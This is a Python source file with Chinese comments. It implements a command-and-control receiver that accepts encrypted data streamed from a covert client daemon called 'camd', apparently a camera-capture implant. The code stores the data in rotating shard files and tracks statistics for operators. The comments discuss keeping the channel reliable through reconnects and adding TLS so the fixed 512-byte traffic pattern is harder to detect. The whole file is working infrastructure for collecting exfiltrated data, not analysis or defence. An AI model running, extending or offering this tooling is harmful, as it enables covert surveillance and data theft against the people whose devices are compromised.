#!/usr/bin/env python3
"""C2 回传收端：接收 camd 边采边发过来的加密信元，分片落盘并计账。

设计约束（都是被现实打出来的，不是纸上推演）：

1. 分片而不是单文件追加
   单文件无限增长会让"取走一批"变成必须 truncate，而 truncate 与正在
   写入的 fd 竞争会丢字节。按大小切片后，收满一片就换文件，取走旧片
   不影响当前写入。

2. 每连接一个线程，而不是单连接
   camd 有进程内重连（见 cam_daemon.c 的 cd_sink_reconnect）。网络抖动后
   它会重新 connect——单连接实现会让第二次连不上，表现为"C2 收了一次就
   再没有数据"，而 camd 侧看起来一切正常。

3. 统计单独落盘，且退出时必须写
   stats.json 是 status 子命令的唯一数据源。若只在正常退出时写，被强杀
   后 status 会读到过期值（甚至文件不存在），运维据此判断"没数据"是错的。
   所以 SIGTERM/SIGINT 都要落盘，且每片切换时也落盘。

4. TLS 是可选的，且必须真的验证
   无 TLS 时信元虽已 AEAD 加密，但流量特征（固定 512 字节节拍）仍可被
   识别。有 TLS 时要确认明文客户端确实被拒——否则"开了 TLS"可能是假的。
"""

import argparse
import json
import os
import signal
import socket
import ssl
import sys
import threading
import time

CHUNK = 64 * 1024 * 1024          # 每片 64 MiB
RECV = 65536


class Sink:
    def __init__(self, outdir, tls_ctx=None, stats_path=None):
        self.stats_path = stats_path
        self.outdir = outdir
        self.tls_ctx = tls_ctx
        self.total = 0
        self.conns = 0
        self.last = 0.0
        self.lock = threading.Lock()
        self.cur = None            # 当前分片文件对象
        self.cur_size = 0
        self.seq = 0
        self._open_chunk()

    def _open_chunk(self):
        if self.cur:
            self.cur.close()
        ts = time.strftime("%Y%m%d-%H%M%S")
        name = "cells-%s-%03d.bin" % (ts, self.seq)
        self.seq += 1
        path = os.path.join(self.outdir, name)
        self.cur = open(path, "ab", buffering=0)
        self.cur_size = 0

    def write(self, data):
        """写入并计账。切换分片必须在持锁状态下做，否则两个连接会写坏同一片。"""
        with self.lock:
            self.cur.write(data)
            self.cur_size += len(data)
            self.total += len(data)
            self.last = time.time()
            if self.cur_size >= CHUNK:
                self._open_chunk()

    def stats(self):
        with self.lock:
            return {
                "total_bytes": self.total,
                "connections": self.conns,
                "last_activity": self.last,
                "shards": self.seq,
            }

    def bump_conn(self):
        with self.lock:
            self.conns += 1

    def dump(self):
        """立即落盘统计。

        不能只靠 5 秒 ticker：运维在采集刚结束就跑 status 会读到过期的 0，
        据此判断'没数据'是错的——而实际上信元已经躺在落盘文件里了。
        实测踩过：camd 跑完 0.8 秒后读 stats，得到 total_bytes=0 而落盘
        已有 2048 字节。连接关闭是低频事件，每次落盘的开销可忽略。"""
        if not self.stats_path:
            return
        try:
            with open(self.stats_path, "w") as f:
                json.dump(self.stats(), f)
        except Exception:
            pass

    def close(self):
        with self.lock:
            if self.cur:
                self.cur.close()
                self.cur = None


def handle(conn, addr, sink, logf):
    sink.bump_conn()
    n = 0
    t0 = time.time()
    try:
        while True:
            b = conn.recv(RECV)
            if not b:
                break
            sink.write(b)
            n += len(b)
    except Exception as e:
        logf.write("[%s] conn %s: %r\n" % (time.strftime("%H:%M:%S"), addr, e))
        logf.flush()
    finally:
        try:
            conn.close()
        except Exception:
            pass
        logf.write("[%s] closed %s bytes=%d dur=%.1fs\n"
                   % (time.strftime("%H:%M:%S"), addr, n, time.time() - t0))
        logf.flush()
        sink.dump()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--cert")
    ap.add_argument("--key")
    ap.add_argument("--stats", required=True, help="统计文件落点")
    ap.add_argument("--log", required=True)
    args = ap.parse_args()

    os.makedirs(args.out, exist_ok=True)
    logf = open(args.log, "a", buffering=1)

    tls_ctx = None
    if args.cert or args.key:
        if not (args.cert and args.key):
            print("[FATAL] --cert 与 --key 必须同时给定", file=sys.stderr)
            return 2
        tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            tls_ctx.load_cert_chain(args.cert, args.key)
        except Exception as e:
            print("[FATAL] 加载证书失败: %r" % (e,), file=sys.stderr)
            return 2

    sink = Sink(args.out, tls_ctx, args.stats)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", args.port))
    except OSError as e:
        print("[FATAL] 绑定端口 %d 失败: %r" % (args.port, e), file=sys.stderr)
        return 3
    srv.listen(64)

    def dump_stats(*_):
        try:
            with open(args.stats, "w") as f:
                json.dump(sink.stats(), f)
        except Exception:
            pass

    def on_term(signum, _):
        dump_stats()
        sink.close()
        logf.write("[%s] stopped by signal %d\n" % (time.strftime("%H:%M:%S"), signum))
        logf.flush()
        sys.exit(0)

    signal.signal(signal.SIGTERM, on_term)
    signal.signal(signal.SIGINT, on_term)

    logf.write("[%s] listening port=%d tls=%s\n"
               % (time.strftime("%H:%M:%S"), args.port, bool(tls_ctx)))
    logf.flush()
    dump_stats()

    # 每 5 秒落一次统计。被强杀时最后一次可能丢失，但窗口只有 5 秒，
    # 远好于"只在退出时写"——那是完全不可用的。
    def ticker():
        while True:
            time.sleep(5)
            dump_stats()

    threading.Thread(target=ticker, daemon=True).start()

    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        try:
            if tls_ctx:
                conn = tls_ctx.wrap_socket(conn, server_side=True)
        except Exception as e:
            logf.write("[%s] TLS 握手失败 %s: %r\n"
                       % (time.strftime("%H:%M:%S"), addr, e))
            logf.flush()
            try:
                conn.close()
            except Exception:
                pass
            continue
        threading.Thread(target=handle, args=(conn, addr, sink, logf),
                         daemon=True).start()


if __name__ == "__main__":
    sys.exit(main())
